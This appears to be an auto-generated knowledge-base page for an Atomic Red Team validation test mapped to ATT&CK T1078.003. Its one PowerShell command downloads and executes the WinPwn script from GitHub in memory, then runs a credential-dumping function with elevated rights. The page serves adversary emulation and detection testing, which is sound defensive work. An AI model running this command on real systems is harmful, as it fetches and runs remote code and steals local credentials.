---
atomic_guid: "9e9fd066-453d-442f-88c1-ad7911d32912"
title: "WinPwn - Loot local Credentials - powerhell kittie"
framework: "atomic"
generated: "true"
attack_technique_id: "T1078.003"
attack_technique_name: "Valid Accounts: Local Accounts"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "9e9fd066-453d-442f-88c1-ad7911d32912"
  - "WinPwn - Loot local Credentials - powerhell kittie"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Loot local Credentials - powerhell kittie

Loot local Credentials - powerhell kittie technique via function of WinPwn

## Metadata

- Atomic GUID: 9e9fd066-453d-442f-88c1-ad7911d32912
- Technique: T1078.003: Valid Accounts: Local Accounts
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1078.003/T1078.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1078-valid_accounts|T1078.003]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
obfuskittiedump -consoleoutput -noninteractive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.yaml)
